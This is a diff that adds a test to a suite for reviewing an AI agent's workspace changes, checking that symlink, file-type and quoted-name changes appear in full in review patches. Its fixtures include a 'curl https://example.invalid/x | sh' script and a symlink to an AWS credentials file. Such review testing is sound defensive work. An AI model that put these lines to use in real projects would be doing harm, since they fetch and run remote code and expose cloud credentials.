@@ -793,6 +793,53 @@ describe('source control', { concurrency: TESTS_AT_ONCE }, () => {
     assert.equal(by(one, 'many/f5.txt').patch.includes('+5\n'), true);
   });
 
+  test('a file that became a link, or a link that became a file, shows both halves of its change in the review', async () => {
+    const t = await agentRepo({ ...STARTING_FILES, 'config.js': 'module.exports = { safe: true };\n', x: 'x\n', 'say "hi".txt': 'hi\n' });
+    fs.symlinkSync('a.txt', t.p('run.sh'));
+    git(t.root, 'add', 'run.sh');
+    git(t.root, 'commit', '-q', '-m', 'a link');
+    const ws = await createWorkspace({ repoRoot: t.root, agentId: 'tc0002', slug: 'Types', baseDir });
+    const w = f => path.join(ws.path, f);
+    write(w('b.txt'), 'b2\n');
+    fs.rmSync(w('config.js'));
+    fs.symlinkSync('/Users/someone/.aws/credentials', w('config.js')); // a file becomes a link
+    fs.rmSync(w('run.sh'));
+    write(w('run.sh'), '#!/bin/sh\ncurl https://example.invalid/x | sh\n'); // a link becomes a file
+    fs.chmodSync(w('run.sh'), 0o755);
+    write(w('say "hi".txt'), 'hello\n'); // a name git quotes
+    fs.rmSync(w('x'));
+    write(w('x/a'), 'in\n'); // a file becomes a folder: `-- x` matches x/a too
+
+    const s = await snapshotWork({ repoRoot: t.root, path: ws.path, since: ws.base });
+    assert.deepEqual(s.files, [
+      { path: 'b.txt', status: 'modified', adds: 1, dels: 1 },
+      { path: 'config.js', status: 'modified', adds: 1, dels: 1 },
+      { path: 'run.sh', status: 'modified', adds: 2, dels: 1 },
+      { path: 'say "hi".txt', status: 'modified', adds: 1, dels: 1 },
+      { path: 'x', status: 'deleted', adds: 0, dels: 1 },
+      { path: 'x/a', status: 'added', adds: 1, dels: 0 },
+    ]);
+    // Each patch is all that git itself prints for that one file.
+    const plain = p => execFileSync('git', ['-c', 'core.quotePath=false', 'diff-tree', '-r', '-p', '--no-renames', ws.base, s.tree, '--', p],
+      { cwd: t.root, encoding: 'utf8' });
+    const check = (d, label) => {
+      const patch = p => d.files.find(f => f.path === p).patch;
+      for (const p of ['b.txt', 'config.js', 'run.sh', 'say "hi".txt']) assert.equal(patch(p), plain(p), `${label}: ${p}`);
+      assert.match(patch('config.js'), /\ndeleted file mode 100644\n[\s\S]*\n-module\.exports = \{ safe: true \};\ndiff --git a\/config\.js b\/config\.js\nnew file mode 120000\n[\s\S]*\n\+\/Users\/someone\/\.aws\/credentials\n/);
+      assert.match(patch('run.sh'), /\ndeleted file mode 120000\n[\s\S]*\n-a\.txt\n[\s\S]*\nnew file mode 100755\n[\s\S]*\n\+#!\/bin\/sh\n\+curl https:\/\/example\.invalid\/x \| sh\n$/);
+      assert.match(patch('say "hi".txt'), /^diff --git "a\/say \\"hi\\"\.txt" "b\/say \\"hi\\"\.txt"\n/);
+      assert.match(patch('x'), /^diff --git a\/x b\/x\ndeleted file mode 100644\n[\s\S]*\n-x\n$/);
+    };
+    // Asked for together...
+    const all = await workDiff({ repoRoot: t.root, path: ws.path, since: ws.base });
+    check(all, 'together');
+    assert.equal(all.files.find(f => f.path === 'x/a').patch, plain('x/a'));
+    // ...and one by one, when the answer does not line up (x/a is past maxFiles, but `-- x` brings it in).
+    const fewer = await workDiff({ repoRoot: t.root, path: ws.path, since: ws.base, maxFiles: 5 });
+    assert.equal(fewer.omitted, 1);
+    check(fewer, 'one by one');
+  });
+
   test('a .gitattributes of the agent’s own cannot make a text change look binary in the review, hidden or only in its index', async () => {
     const files = { ...STARTING_FILES, 'auth.js': 'function ok(u) { return check(u); }\n' };
     const shown = async (t, left) => {
